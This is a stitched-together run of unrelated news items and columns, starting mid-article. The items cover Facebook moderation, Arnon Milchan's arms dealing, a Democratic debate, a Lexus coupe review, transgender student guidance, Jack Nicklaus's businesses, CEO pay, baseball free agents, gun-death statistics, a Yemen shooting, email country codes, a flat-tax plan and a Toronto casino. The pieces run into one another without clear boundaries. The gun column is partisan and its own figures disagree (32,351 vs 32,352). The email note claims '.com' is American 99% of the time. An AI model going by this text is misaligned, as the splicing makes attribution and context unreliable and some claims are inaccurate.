In a statement to the Guardian on Monday, Facebook said: “The post was removed – and profile suspended – in error and restored as soon as we were able to investigate. Our team processes millions of reports each week, and we sometimes get things wrong. We're very sorry about this mistake.”
A spokesperson said the content did not violate the company's standards.
King noted that Facebook's censorship decisions can have a huge impact on people's lives, citing the recent case of the company shutting down the livestream of Korryn Gaines, a Baltimore woman who was engaged in a standoff with police. Officers subsequently killed her.
In his recent post on censorship, King pointed out that some users have had “accounts suspended for FIGHTING BIGOTRY while the bigots often seem to be able to say whatever the hell they want”.
“I want them to filter out some of the ugly hateful stuff,” he said in interview, adding that he has a lot of “sympathy” for Facebook and there is no easy solution. “It just again reveals how damn difficult it must be to manage this platform.”
Still, King said his ban, even if it was brief, served as a wake-up call about Facebook's extreme power over its users.
“You realize very quickly that you don't own it,” he added. “They didn't shut down my Facebook page. They shut down their Facebook page that they let me use.”
Hollywood producer gives interview in which he confirms earlier claims that he was an arms dealer
The Hollywood producer behind box office hits including Fight Club, Pretty Woman and LA Confidential has spoken about his life as an Israeli secret agent and arms dealer, saying he was proud of working for his country.
Arnon Milchan gave a lengthy interview to the Israeli documentary programme Uvda, broadcast on Monday on Channel 2, confirming claims made earlier in an unauthorised biography that he worked for an Israeli agency which negotiated arms deals and supported Israel's secret nuclear weapons project.
Milchan, who was born in Israel, was recruited as a young businessman to the Bureau of Scientific Relations by Shimon Peres, now Israel's president, in the 1960s. The bureau, which worked to obtain scientific and technical information for secret defence programmes, closed down in 1987.
Milchan, 68, is now the chairman of New Regency, which has produced more than 120 Hollywood movies since the 1970s, working with actors and directors such as Robert de Niro, Martin Scorsese, Roman Polanski, Oliver Stone, Russell Crowe and Ben Affleck.
During the programme, Michan said: “Do you know what it's like to be a 20-something-year-old kid [and] his country lets him be James Bond? Wow! The action! That was exciting.”
At the peak of his activities, he was operating 30 companies in 17 countries and brokering deals worth hundreds of millions of dollars, according to the programme.
But, Milchan said, it was a challenge to overcome his reputation as an arms dealer. “In Hollywood, they don't like working with an arms dealer, ideologically… with someone who lives off selling machine guns and killing. Instead of someone talking to me about a script, I had to spend half an hour explaining that I'm not an arms dealer. If people knew how many times I risked my life, back and forth, again and again, for my country.”
He should have foreseen the difficulties and been more robust about disapproval, he added. “I should have been aware of that, of what I'll go through, and said, ‘Fuck you. You know what? I did it for my country, and I'm proud of it.'”
In Hollywood, he said, he detached himself from “physical activities” in order to devote himself to film-making. However, he claimed to have used connections to promote the apartheid regime in South Africa in exchange for it helping Israel acquire uranium.
In an appearance in the programme, de Niro said he once asked Milchan about rumours concerning clandestine activities on behalf of Israel. “He told me that he was an Israeli and that of course he would do these things for his country,” the actor-director said.
According to Ilana Dayan, the investigative journalist who made the programme, Milchan “has been an entrepreneur since his early 20s, crossing from various realms of business, showbusiness, politics and military, always bringing his unique charm and way of befriending and creating close bonds. And that was early on identified by Peres.”
“Milchan walks a fine line of being both an insider and an outsider,” she told The Hollywood Reporter.

The Democratic primary debates are the only chance for the second tier of candidates---Martin O'Malley, Lincoln Chafee and Jim Webb---to get on the radar in an election that is mostly seen in the press as a Bernie Sanders vs. Hillary Clinton stand-off. It's hard to declare a winner halfway through the debate, but it's already clear who the major loser is: Jim Webb. He was already struggling in a campaign that is defined by the two leading candidates competing to be viewed as the most progressive, but he made it worse during this debate by coming across at obtuse and, at times petulant.
Webb spent much of the debate whining about not getting as much attention as the front-runners, even though moderator Anderson Cooper reminded him that whining takes up precious time. He seemed to think that his comfort with Republicans was an asset, bragging about working for the Reagan administration and how he has "a record of working across the political aisle." In previous elections, that might have been a smart strategy, but not in a year when Republicans are falling apart so badly that even David Brooks has to admit it.

But where he really fell apart was on the issue of racial justice. When Cooper asked him about his previous claims that affirmative action is "state-sponsored racism," Webb thought it wise to opine on his elaborate theories on race, arguing that it's cool for black people but that he opposes "diversity programs that include everyone, quote, 'of color,'" as if racism only counts if it's a black-white thing. When asked about the Black Lives Matter movement, all the other candidates aligned themselves with the movement and offered solid policy ideas. Webb punted, however, telling a lengthy story about how he helped one man, who happened to be black, clear his name after a murder conviction. A nice story, but he totally ignored the systematic issues that Black Lives Matter exists to address.
Jim Webb did help everyone else look better by comparison. That's not nothing, but probably not why he thought it was a good idea to run for president.

As a counterpart to the recently evolved segment of shapelier but less practical SUV “coupes,” another contrarian group of vehicles has cropped up at the opposite end of the spectrum: luxury two-doors with only moderately powerful engines. While they may look like sporty grand tourers, they're missing a key ingredient—power—to really call them that. The Lexus RC Turbo coupe, badged as the RC200t, is one of the latest examples, having joined the lineup for the 2016 model year. Following in the turbo path of the Lexus IS sedan, it's the cheapest model in the RC lineup, and it shares its small forced-induction four-cylinder with the NX, IS, and GS.

Priced to Move
One of the RC200t's chief selling points is its price. A starting figure of $41,150 makes this striking-looking luxury coupe fairly accessible. It's also cheaper than several of its major competitors, including the $43,575 Mercedes-Benz C300 coupe, the $43,145 BMW 430i, and the Audi A5 ($43,150 with automatic, $42,150 with manual transmission). Two others undercut the RC's price, however: the Cadillac ATS coupe, at $38,590, and the $39,855 Infiniti Q60.

Our test car was equipped with the Premium package, a $1240 option bundle that adds blind-spot monitoring with rear cross-traffic alert and heated and ventilated front seats, as well as the $1470 Navigation package (navigation, plus an in-dash CD and DVD player, Lexus's touchpad infotainment control, voice command, and the Lexus Enform suite of apps). A few other extras, such as adaptive cruise control and illuminated doorsills, brought the total to a still reasonable $45,254.
Everybody's Lookin'
Appearance is subjective, but for the most part, the other cars at the low end of the premium-coupe segment lack the extroverted flair of the RC with its gaping spindle grille, checkmark lighting graphics, and aggressively textured and layered bumpers. In this group, it's the “look at me” choice, and even more so in F Sport trim, a $4105 option that also brings suspension and brake upgrades.

The engine is a 2.0-liter inline-four with a twin-scroll turbocharger helping to pump out 241 horsepower at 5800 rpm and 258 lb-ft of torque at 1650 rpm. The engine is paired with a fluid eight-speed automatic transmission that routes its output to the rear wheels and can be operated via paddles. Unlike some of the RC's competitors, there is no option for all-wheel drive or a manual transmission on the RC200t. Lexus does offer all-wheel drive in the V-6–powered RC300 ($43,745) and the more powerful RC350 ($46,150).

The burden of 3796 pounds—heavier than the ATS, A5, or 430i—dulls the RC Turbo's responses, and as a result the car doesn't quite live up to the image its looks project. We recorded a zero-to-60-mph time of 6.7 seconds and a 15.1-second quarter-mile pass at 96 mph. By comparison, the Mercedes-Benz C300 got to 60 mph in 6.0 seconds, while the last four-cylinder BMW coupe we tested (a 428i) did the deed in 5.5 seconds.
Braking wasn't much better, with a 171-foot stop from 70 mph and grabby pedal feels. The competition, which we note all had summer performance tires, did significantly better, with the C300 needing only 157 feet and the 428i requiring 164 feet. With the F Sport package, which brings summer tires along with upgraded brakes, the RC mostly closes that gap, with a 165-foot result.
We averaged only 19 mpg with the RC Turbo, versus the EPA's combined rating of 26 mpg. We didn't take any long trips, so most of the driving was around town, and our collective heavy right foot probably dragged down that number. When fuel efficiency is supposed to be a perk of choosing the small turbocharged engine, less than 20 mpg (and less than 30 mpg on the highway) is a letdown.

The rest of the RC200t's driving manners are competent and agreeable. The steering is nicely weighted, not too heavy or too light, and the car turns in eagerly. The RC pulled 0.88 g on the skidpad, which is strong considering its all-season tires, although subpar against the performance-tire set. But the car is composed in corners, holding an intended line and communicating grip loss progressively. Lexus's reputation for a comfortable and quiet ride rings true here, as the RC rolls over bumps and broken pavement all but undisturbed.
Cozy Cabin
Inside, the RC is soft and cozy. The thickly bolstered seats, the high beltline, and the raised center tunnel create a tucked-in feeling and combine with the coupe profile to make the RC hard to see out of. Some might find the layered, multilevel dash design overly busy, but there's elegance to its ergonomics, fit, and finish.

The wood trim looks high quality, the substantial metal dials lend a sense of occasion in use, and there are plentiful soft touchpoints. However, the capacitive-touch temperature slider and the infotainment system's touchpad are annoying in regular use and require too much of a driver's attention, which is less than safe while on the move. Space also is not the RC's forte; the rear seats are cramped, and, at 10 cubic feet, so is the trunk.

The Lexus RC200t is for budget-conscious luxury buyers seeking visual rather than driving excitement. It looks fast and has an upscale badge, but it lacks overtly sporting tendencies. It has the style of a sports coupe, but it's built more for comfort.
After the Department of Education and the Department of Justice rescinded Obama administration guidance regarding transgender students in February, the Department of Education's Office for Civil Rights has received new guidance on how to deal with cases of discrimination against transgender students.
The instructions, issued to employees last week, say officials should rely on “Title IX and its implementing regulations ... in evaluating complaints of sex discrimination against individuals whether or not the individual is transgender.”
An employee familiar with the guidance ― which was obtained by HuffPost and can be read in full below ― says he interprets this to mean that officials should investigate issues of discrimination just as they would have before the Obama-era rules were implemented.
The Obama administration called on school districts to treat a student's gender identity as their sex and to treat students in a way consistent with their gender identities, including when it came to bathrooms and locker rooms. After rescinding this guidance, Trump administration agencies sent a letter saying the issue should be decided at the local level.
The Trump administration guidance calls on OCR investigators to look into situations in which schools failed to protect transgender students who face sex discrimination, harassment or different treatment based on sex stereotyping. It specifically mentions instances of harassment in which transgender students are called the wrong pronoun or name.
However, groups that advocate for transgender students fear that the OCR is trying to shirk responsibility for protecting students against bathroom discrimination.
Only one part of the instructions specifically mentions student bathrooms, in an example explaining that investigators should not dismiss an entire complaint because specific allegations have been rejected. Specifically, the instructions say that investigators should not reject gender harassment allegations in a complaint, even if they have dismissed allegations involving “denial of access to restrooms based on gender identity.”
“They are hinting that they are not enforcing the law,” said Mara Keisling, executive director of the National Center for Transgender Equality.
While Keisling said her organization is still trying to figure out the exact legal ramifications of this memo, she “would not be surprised if this turns out for the worst.”
A statement from the Gay, Lesbian, & Straight Education Network expresses similar concern.
“GLSEN calls on OCR to specify whether they will defend trans students' access to safe and appropriate school facilities – regardless of where the student lives or what local protections may or may not exist. Forcing trans students to use restrooms that do not align with their gender identity puts those students at risk of harassment and violence,” GLSEN Executive Director Eliza Byard stated.
Across the country, there have been a handful of high-profile lawsuits over whether or not students can use school bathrooms that are consistent with their gender identities.
Groups that advocate for LGBTQ students met with Department of Education officials Friday morning in an off-the-record meeting. The Department of Education did not respond to requests for comment.

Golfers have longer careers than most pro athletes, but it's been a long time since Jack Nicklaus made his primary income from swinging a club. The man who won a record 18 major championships considers the pair of Senior Tour wins he notched in 1996 to mark the end of his playing career, though he continued playing in occasional PGA Tour events and the Masters through 2005.
But don't ask Nicklaus what he thinks about retirement. The man has little use for the term, and bristles at the suggestion that he's retired.
"I stopped playing competitive golf, but that was just one part of my business life," Nicklaus says on a warm February day at the North Palm Beach, Fla. offices of Nicklaus Design.
Seated on a swiveling desk chair and surrounded by light tables covered in sketches and blueprints for golf courses the firm is in the process of building and renovating around the world Nicklaus certainly seems as if there's nowhere else he would rather be.
"Most people work all their lives so they can eventually stop and go play golf," he says. "I played golf my whole life and when I stopped I went to work."
That is not to say Nicklaus doesn't enjoy other pursuits – he's an avid fly fisherman, goes bow-hunting with his sons and plays more tennis than golf these days – but developing and designing courses remains his passion.
Nicklaus Design, created almost 45 years ago, has designed more than 380 courses in 36 different countries. Courses built, designed or consulted on by Nicklaus host regular PGA Tour stops like the Memorial Tournament (at Ohio's Muirfield Village) and the RBC Heritage (South Carolina's Harbour Town Golf Links). In 2014 the Ryder Cup will be hosted by Nicklaus' PGA Centenary Course at Gleneagles in Scotland, and the 2015 President's Cup will be played on a Nicklaus course in Incheon, South Korea.
The course design is just one business under the umbrella of the Nicklaus Companies though, an umbrella that is constantly evolving to cover new ventures, most recently a new line of golf balls and a lemonade deal with Arizona Beverage Company.
The long list of businesses and marketing deals is impressive, with ties to names like Allen Edmonds, Perry Ellis and Rolex , giving the company the feel of a business empire. What people don't realize though, Nicklaus says, is that he nearly lost it all twice.
The first time was after the company couldn't fulfill ill-considered completion guarantees for a pair of courses (St. Andrews in New York and California's Bear Creek) that it couldn't fulfill. The second mistake was when Nicklaus took a portion of the business – not the course design branch -- public in 1996 as Golden Bear Golf. An initial warm reception turned sour as accounting malfeasance at a golf course construction subsidiary sparked multiple shareholder lawsuits and led to costly settlements, and ultimately the repurchase of the shares in a deal that cost Nicklaus millions.
"I really did it because it gave the guys who had worked for me a while the chance to cash in a little bit," says Nicklaus of the IPO. "My background was as a golfer, I didn't have the business background to understand what I was getting myself into," he continues. "I'm much better off today with a business partner who will guide the company beyond my work time and my lifetime."
That partner is Howard Milstein who bought 49% of the company in 2006 for $145 million. Milstein, chairman and CEO of New York Private Bank & Trust, which operates Emigrant Bank, says he was a fan of Nicklaus but even more intrigued by the business opportunity.
"In the branding business you get to play offense," says Milstein. "We don't invest and lend money, we license and get a percentage of sales; there's very little risk and a lot of upsides."
When the partnership began Nicklaus signed a five-year contract, but the financial crisis that followed shortly thereafter wrecked those plans.
"I didn't think my partner would get a fair shake and I didn't think the income would continue for my family [if I stepped away]," Nicklaus says, though he admits it was unlikely he would have left anyway.
After all, Nicklaus is hardly a figurehead. He travels incessantly, visiting courses around the world that are in various stages of design and operation, particularly in China, which both he and Milstein believe is the next great frontier for golf.
Nicklaus visits China three or four times a year, and Milstein notes that for a country with more than a billion people, there are only about 800 golf courses. Compare that to more than 15,000 courses in the U.S., a country of 317 million people.
The course design business is a passion Nicklaus, but he also speaks with pride of the company's other endeavors, particularly the new golf balls, which are color-coded to the white, blue and black tees golfers play.
The color-coding makes for easier purchasing decisions than the traditional way golf balls are sold, based on clubhead speed, which most duffers don't understand. There is also a charitable element; the balls sell for $30 per dozen online (versus $50 at Nicklaus course pro-shops), with buyers encouraged to make a donation to the Nicklaus Children's Health Care Foundation.
"The charitable part is nice," Nicklaus says, but the bottom line matters too. "You either make a profit or you're not in business."
Both the golf ball venture and the deal with Arizona have been fruits of the partnership with Milstein, who says he's been impressed by Nicklaus' passion for business over the last six-plus years.
"He could do half of what he's doing and it still would be much more than most people," Milstein says. "The essence of the man is that he loves to compete."
That is reinforced when Nicklaus discusses the Arizona Beverage deal, which began in 2012.
"I didn't want to step on Arnold's toes," he says, speaking of fellow golf legend Arnold Palmer, who was already selling his eponymous beverage (half iced-tea, half lemonade) with Arizona.
But once Palmer made it clear he had no objection, Nicklaus got back into competitor mode.
"It took Arnold six years to get to where we got in our first year," he says of the Arizona Golden Bear Lemonade, and company projections anticipate a 50% sales increase in 2014.
Nicklaus' latest venture is the closest he's come to dealing with the public markets in years, an investment in Fantex, the company that aims to sell tracking stocks for athletes like Arian Foster and Vernon Davis. Having invested in the company and joined its advisory board, Nicklaus says he wishes something similar existed during his career.
"It could increase your fan base, because people are interested in you and want to invest in you," he says.
The newest foray is fun, but doesn't distract from his primary focus, which is continuing to build Nicklaus Companies into something that can survive and thrive long after he is gone.
"It was never important to me to be the wealthiest person," he says, stressing the overarching motivation of providing for his family.
"Frankly, I'd just as soon die penniless. Just not today."

The ratio of CEO pay to an average worker's salary is on the rise again. (Economic Policy Institute)
Want to know exactly how much richer the average chief executive is than you and me? Take a look at the Economic Policy Institute's latest white paper, which tracks the growth of CEO compensation over the last half century. Here are the major takeaways:
Average pay for the CEOs of the top 350 firms, including the stock options they exercised, was $14.1 million in 2012--up 37.4 percent from 2009.
That's a bit higher than it would be if you just measured stock options granted. "Firms apparently pared back the value of new options granted because CEOs fared so well by cashing in options as stock prices grew," the report's authors write.
The ratio of CEO pay to average worker pay is 273-1, down from a high of 383-1 in 2000, but up from 20-1 in 1965.
CEO pay has increased faster than wages to high-skilled workers, suggesting that the salary market isn't very efficient. "Consequently, if CEOs earned less or were taxed more, there would be no adverse impact on output or employment," the report concludes.
CEO pay is now also closely tracking the S&P 500 index, which didn't use to be the case.
With the sun setting on the 2014-15 free agent class, it's time to turn our attention to the 2015-16 group. These players project to become free agents after the 2015 season, unless they sign contract extensions first. A few extensions are likely, but for now the 2015-16 free agent class has no shortage of star power. MLBTR's full list of 2015-16 free agents can be found here.
What exactly are we ranking here? The simplest explanation would be earning power. These rankings represent expected contract size, assuming each player reaches the open market and goes to the highest bidder. Of course, nothing affects a free agent's earning power more than his most recent season, so I'll be updating these rankings monthly.
1. Justin Upton. Upton possesses the profile that most often results in a monster contract: power, youth, and durability. He doesn't turn 28 until August, so his next team might be able to avoid paying him into his late 30s. The first overall draft pick in 2005, Upton has hit 26 or more home runs in four of his six full seasons, including the last two. He peaked at 31 bombs in 2011, and given his pedigree, there's an underlying assumption that he's capable of hitting 35-40. With the December trade to San Diego, Upton must verify his power in a home ballpark where longballs go to die. He's nothing special defensively; Upton's chance at Robinson Cano money or better lies in good old-fashioned baseball card stats.
2. Jason Heyward. Upton's former teammate can challenge his ranking with a big year for the Cardinals. Unlike Upton, Heyward didn't surrender any potential free agent years through a mid-career extension. The result: Heyward doesn't turn 26 until August. That's about as young as a star free agent can reasonably be, given the requirement of six years of Major League service. Heyward seemed destined for MVP awards after he finished second in the Rookie of the Year voting with a great season at age 20. However, he hasn't been able to repeat his .393 on-base percentage from that season, and he missed large chunks of the 2011 and '13 seasons due to injuries. Heyward hit 27 home runs in 2012, so he still owns that skill despite hitting just 25 in the two subsequent seasons. More than his offense, Heyward's value is derived from Gold Glove defense in right field. If he posts another slugging percentage under .400, his free agency will be a litmus test of whether teams will pay superstar money for superstar defense. If he couples that defense with rediscovered 25+ home run power, Heyward could sign the largest free agent contract in baseball history.
3. David Price. This is a very strong crop of free agent starting pitchers at present, but Price is the best. 30 in August, Price won the AL Cy Young award in 2012 and finished sixth in the voting last year. Last year he tossed 256 1/3 total innings with a career-best strikeout rate, while maintaining the excellent control he established in 2013. The only real blemish on his health record is a 47-day DL stint in '13 for a triceps strain. If he racks up innings this year for the Tigers with another low-3s ERA, he might be able to exceed $200MM without relying on deferred money to get there.
4. Ian Desmond. The Nationals' shortstop rejected a seven-year, $107MM extension offer during the 2013-14 offseason, according to Adam Kilgore of the Washington Post. Kilgore reported that the offer was actually only for five additional seasons, and it included deferred money. Desmond, 30 in September, has the potential to exceed $200MM on the open market with another strong season. In terms of wins above replacement, he's easily been the game's best shortstop since 2012. Desmond offers the extremely rare combination of power, durability, speed, and solid shortstop defense. However, his contact rate dipped below 70% for the first time in 2014, and a continuation of that trend would affect his earning power.
5. Johnny Cueto. Only Clayton Kershaw's brilliance prevented Cueto from winning the NL Cy Young award in 2014. Cueto, who turned 29 last Sunday, posted a 2.25 ERA over 243 2/3 innings last year with a career-best strikeout rate. That was a huge workload, especially since Cueto was limited to 11 starts in 2013 due to a shoulder strain. He missed significant time in 2011 with shoulder issues as well. Cueto can set aside some concerns with a DL-free 2015 campaign. Potential bonus: he could become ineligible for a qualifying offer if the Reds trade him during the season.
6. Jordan Zimmermann. Zimmermann, 29 in May, finished fifth in the NL Cy Young voting last year. A few factors put him below Cueto: he doesn't go particularly deep into games, and he's generally posted strikeout rates below the league average prior to 2014. That might be nitpicking – Zimmermann has great control and a 3.00 ERA since 2011. He had Tommy John surgery in August 2009 and has avoided the DL since.
7. Alex Gordon. Gordon is an older version of Heyward – an occasionally underpowered corner outfielder who posted a huge WAR last year on the strength of great defense. Gordon still has 39 home runs over the last two seasons, though, so he's shown more recent pop than Heyward. Gordon, drafted by the Royals directly after Upton in '05, delayed his free agency by two years with an extension in 2012. As such, he recently turned 31. As Shin-Soo Choo can attest, that's still young enough to garner a contract well above $100MM. In August, Gordon told Andy McCullough of the Kansas City Star he plans to pick up his 2016 player option, which appears to be worth $14MM. If the Royals are willing to double their current franchise record $55MM contract, an extension could be possible, but I don't think there's much chance of Gordon simply picking up that player option when it comes due.
8. Zack Greinke. After the 2015 season, Greinke must decide whether to opt out of the remaining three years and $71MM left on his contract. That wouldn't be worth doing for something similar to the four-year, $75MM contract James Shields just received, but Greinke will be a year younger than Shields was. So far Greinke has a 2.68 ERA in 380 innings in his two seasons for the Dodgers, with his strikeout rate bumping back up in 2014. Another healthy season with an ERA around 3.00 would instill confidence in a potential five-year deal, in which case Greinke would be expected to opt out to try to lock in $100MM+ in new money.
9. Jeff Samardzija. Samardzija, 30, made his first All-Star team in 2014. He posted a 2.99 ERA in 219 2/3 innings for the Cubs and A's after posting a 4.10 ERA in his previous two seasons as a starter. It was clear that Samardzija's 2012-13 ERAs were inflated beyond his skill level. He's a horse who works at 94-95 miles per hour, and he's never been on the disabled list. A wide receiver at Notre Dame, Samardzija didn't commit fully to baseball until the Cubs drafted him in '06. He also spent much of his early big league career as a reliever. The result is less mileage on his arm than any of the pitchers listed above him, even including Zimmermann. He could easily wind up being a better bet for the next five or six years than his rival free agent starters. Samardzija was traded to the White Sox in December.
10. Matt Wieters. Wieters, 29 in May, saw his season end on May 10th of last year due to an elbow issue. The catcher had Tommy John surgery in June and expects to be ready for Opening Day. Will he be able to throw out baserunners? Wieters, who was drafted by the Orioles fifth overall in 2007, also must answer questions about his bat. He slumped to a .704 OPS in 2013, but had a great first month in '14. Wieters tallied a mammoth 4,600 innings behind the dish from 2010-13, and it's difficult to say when that workload will catch up to him. Wieters could get a nine-figure contract this offseason, but only if all of these questions are answered with a strong year.
Plenty of other players will be vying to break into our top ten throughout the season, including Ben Zobrist, Yoenis Cespedes, Denard Span, Howie Kendrick, Steve Pearce, Rick Porcello, Mat Latos, Doug Fister, Hisashi Iwakuma, and Chris Davis. You can check out the full 2015-16 free agent list here.
When the President went on television after the Oregon college mass shooting he issued a challenge to the media. He asked them to show America the number of gun deaths as compared to the number of terrorism related deaths since the 9/11 attacks. The media dutifully complied and soon every network, newspaper and magazine was putting up startling graphics, such as this one tweeted by CNN.
These graphics and figures were almost uniformly followed by comments about the mass shooting and the “pressing need” for background checks and other gun control laws. Unfortunately, all of these numbers flashing around were dishonestly offered up with no context or details. As it turns out, however, the real numbers are available from a variety of sources including the FBI and the CDC, among others, so let's take a look at them. It takes federal agencies a long time to compile and publish their statistics, so the last full set of data we have is from 2011 and the figures can shed a lot of light on exactly how mendacious gun control advocates are being with these studies.
First of all, look at the number of gun deaths on that chart from 2011. It's 32,351. That's a lot of gun deaths to be sure. So that's the total number of murders by gun owners, right? The answer is not only Hell No, but it's not even remotely close. It's true that this figure is close to the total number of human lives ended in incidents involving a gun, but that's all incidents. So how did those deaths happen?
Straight from the CDC where most of the media is drawing their numbers (while not as good of a source as the FBI or the Justice Department) we can find out that of those 32,352 gun deaths, 21,175 of them were suicides. That leaves us with 11,177 deaths to account for. But as it turns out, the FBI records that 8,583 deaths were murders of various sorts involving guns of all types. The remaining roughly 2,500 were accounted for by accidents and unintentional injuries. These include hunting accidents, toddlers getting hold of unsecured weapons and shooting somebody or just plain idiots who proved Darwin right.
Before we move on, those FBI numbers deserve a closer look for a moment since we're on the subject. What sorts of guns are used in actual crimes? I bring this up because each mass shooting elicits renewed calls for an “assault weapons” ban on guns like the AR-15 style rifle. Are those popular in crimes? Check out the figures from the FBI report.
Take a good look at those numbers. Of the actual 8,583 gun murders committed in 2011, 323 were committed with “rifles.” And that's all rifles, including bolt action, deer hunting rifles and all the rest. The number committed with so-called “assault rifles” were a fraction of that. When you ask how dangerous those rifles are, compare that to nearly 1,700 who were stabbed as well as nearly 500 murdered with blunt objects and and more than 700 beaten to death by somebody with their bare hands. Enough said on that topic.
So we're down to 8,583 intentional killings using guns. That's still one heck of a lot of bodies, and surely enough to justify new background checks and other restrictions on legal gun purchases, right? Again… not even close. The Justice Department has been studying the question of legal vs. illegal sources of guns used in crimes for decades, going back to this study issued in the early nineties. They admit that the numbers are simply too hard to track for us to pin down exact figures, but the trends are steady over the years. The vast majority of guns used in crimes were gotten through illegal means outside the legal purchase regimen followed by law abiding gun owners. Roughly one quarter of inmates convicted of gun crimes admitted to having stolen a gun in that study. For the ones that weren't stolen directly, another 2004 study showed that 40% of convicts bought their guns on the black market and another 37% got them through the “gray market” in various illegal methods.
In fact, one study after another has shown that legally purchased weapons which followed all the normal firearms transfer rules accounted for somewhere between six and eight percent of all murders. And the majority of those were domestic violence incidents, violence between family members, crimes of passion and, yes… murders committed by the insane. But let's give the gun grabbers the benefit of the doubt, round it up and say that ten percent were committed with legally purchases guns. That works out to around 850.
850 is too many people, but it's a far cry from more than 32,000 per year.
So what do you want to do about it?
Now that we've discovered who is being killed by guns and how it's happening, let's put some actual solutions on the table. First of all, as we saw above, the vast majority of gun deaths are suicides. That's not a gun control issue. Suicides largely fall into two groups: the depressed, hopeless and mentally ill or those suffering from terminal illness looking for a fast way out. For the former we definitely need to be providing more help and counseling to the hopeless and the depressed, allowing them to find a better way to deal with their problems than a terminal exit. And the mentally ill remain a major – but not gun control related – challenge for our legislators to deal with. For the terminally ill, as toxic of a subject as it may be, assisted suicide laws such as are already in place in a couple of states might at least offer those on their way out of this world a more peaceful and medically sound path than putting a barrel in their mouth.
Accidents account for too many deaths and that's a place where responsible gun owners must always strive to improve in terms of educating the public. The NRA does some great work in this area, but there are still too many people making careless, stupid mistakes which wind up costing somebody their life. Also, the number of stolen guns can be cut down if more owners take the necessary precautions to make it harder for thieves to steal their weapons from their homes and automobiles.
As to the big ticket media item of real criminals committing murders and other crimes with guns, we've identified the lion's share of those above. They are buying guns illegally because they can get away with it. That's already illegal. The answer here isn't new laws to restrict the law abiding who aren't going to be committing crimes in the first place. We need to be enforcing the laws we already have. Get more resources on the job to find and confiscate illegal weapons from criminals. Stop hampering the police with politically correct restrictions and let them get back to the broken windows, stop and frisk, see something say something approach which finds guns in the hands of common criminals before they are used in a murder. We have laws on the books against all these things. We're just not enforcing them.
There you have it. Problem explained and solutions offered. My liberal friends are now invited to tell me exactly what else you'd like us to do if you're not willing to take these vary basic steps toward correcting the actual problem which you seem so concerned over. Unless, of course, you don't actually care about the problem and are only looking for an excuse to flush the Second Amendment down the social justice drain.
A masked gunman assassinated a Yemeni security official at the U.S. Embassy in a drive-by shooting in the capital Sanaa on Thursday, officials said.
The Yemeni officials said the killing bore the hallmarks of an Al Qaeda attack, but it was too early to determine if the group was behind it. They spoke on condition of anonymity because they were not authorized to speak to the media.
The assassination resembles other attacks targeting Yemeni intelligence, military and security officials in retaliation for a wide military offensive by Yemen's U.S.-backed government against Al Qaeda's branch in the country.
Yemen-based Al Qaeda in the Arabian Peninsula, which Washington considers the most dangerous offshoot of the terror network, had taken advantage of a security and political vacuum created by last year Arab Spring-inspired uprising and seized territories and cities in the south. The government-led offensive has pushed the militants out to mountainous areas from where they have been staging suicide attacks and assassinations inside cities.
Two weeks ago, a top intelligence official, Col. Abdullah al-Ashwal, was also killed in a drive-by shooting in Sanaa.
The embassy security official was identified as Qassem Aqlani, in his fifties. He was on his way to work when the gunman on a motorcycle opened fire at him and fled the scene. The attack was in western Sanaa, close to his home, while the embassy is located in eastern Sanaa.
Aqlani had been working for the U.S. Embassy for nearly 20 years.
Internet Country Abbreviations
You can usually tell what country someone is in by looking at their email address.
For instance, micky.mouse@ukonline.co.uk is in the United Kingdom. The trick is to look at the last two letters of the email address. They will usually be a fairly obvious abbreviation of the country name
In addition to explicit country codes, it is also helpful to know that ".com", ".net", ".edu", and ".org" are U.S. domains 99% of the time.

On Thursday, GOP presidential hopeful Sen. Rand Paul (R-Ky.) unveiled his plan to give the economy a “steroid injection” by rewriting the country's tax code down to a simple, straightforward flat tax of 14.5 percent on personal income and a 14.5 percent “business activity tax.” By Paul's reckoning, this would save taxpayers billions and supercharge the economy almost immediately upon implementation. But at least one nonprofit group that advocates tax reform is saying that, just like a real steroid injection, Paul's scheme to quickly bulk up the economy may have long-term and devastating effects for its health.
Setting aside all other questions about the credibility of a flat tax, nonprofit think tank Citizens for Tax Justice released its analysis of Paul's proposal, and it's ugly.
When the dust clears, this would leave the federal government with $1.2 trillion less in tax revenue in fiscal year 2016 if the plan were implemented immediately—a reduction of about one-third in total federal revenues. Over a decade, the plan would cost a stunning $15 trillion.
Ultimately, the fiscal realities of the tax plan might not matter. The flat tax has never caught fire as a presidential election issue. In 2012, Herman Cain had his “9-9-9” plan and Rick Perry suggested a 20 percent flat tax. Most famously, in 1996 there was Steve Forbes, who briefly looked like he could turn his magazine-famous name into a politically relevant one—but didn't.
The hype over building a new casino/hotel complex in Toronto is starting to resemble the hype over building SkyDome in the 1980s.
Considering what a mixed blessing SkyDome, now the Rogers Centre, has been, it's time for some adult supervision of the process that will lead to the political decision whether Toronto gets a new casino or not.
While Mayor Rob Ford supports it, I'm not convinced a casino will be good for Toronto, but that's city council's call to make.
The problem is that with half-a-dozen U.S. and Canadian mega-developers, including MGM Resorts, Caesars Entertainment, and, as of Friday, Oxford Properties Group, prowling the corridors of power at City Hall, promising councillors every conceivable bell and whistle in return for support of their various multi-billion-dollar proposals, the lack of public input has been alarming.
Any one of these gambling/hotel mega-complexes proposed for everywhere from the Port Lands to the Metro Convention Centre to Exhibition Place would impose huge new pressures on the city's already badly-congested downtown core.
And yet when a few dozen Toronto residents — both proponents and opponents — attended a meeting at City Hall last week to discuss casino zoning issues, Coun. Giorgio Mammoliti absurdly described it as an “illegal” gathering, dismissing it as “the City Hall show” and that “the only thing missing are the cancan girls.”
Nonsense. The real “cancan” show is going on in councillors' offices, orchestrated by high-powered executives and lobbyists for the competing casino operators.
They're promising councillors everything from millions of dollars in new property taxes, to thousands of new jobs, to, in one case, a new permanent home for Cirque de Soleil in Toronto, in order to seal the deal in their favour.
Adding to the pressure on council to reach a decision quickly is Ontario Lottery and Gaming Corp. Chairman Paul Godfrey's deadline that council must decide on whether it wants a casino by early 2013, or the province will move the project to a willing municipality elsewhere in the GTA.
Godfrey is my former boss at the Sun whom I view as one of the great city builders of Toronto in both his public and private roles as everything from a former Metro chairman, to president of the Blue Jays, to his current position as President and CEO of Postmedia Network. He's also done a good job of cleaning up the scandal-plagued OLG.
But, just as I disagreed with him years ago about SkyDome, of which he was the pre-eminent booster and supporter, I don't agree it's his place, as a political appointee of Premier Dalton McGuinty, to dictate the timing of an important decision about approving a giant casino/hotel complex to city council.
McGuinty's interest in overhauling the gaming industry in Ontario — a central part of which is building a massive new casino in the GTA — isn't based on altruism.
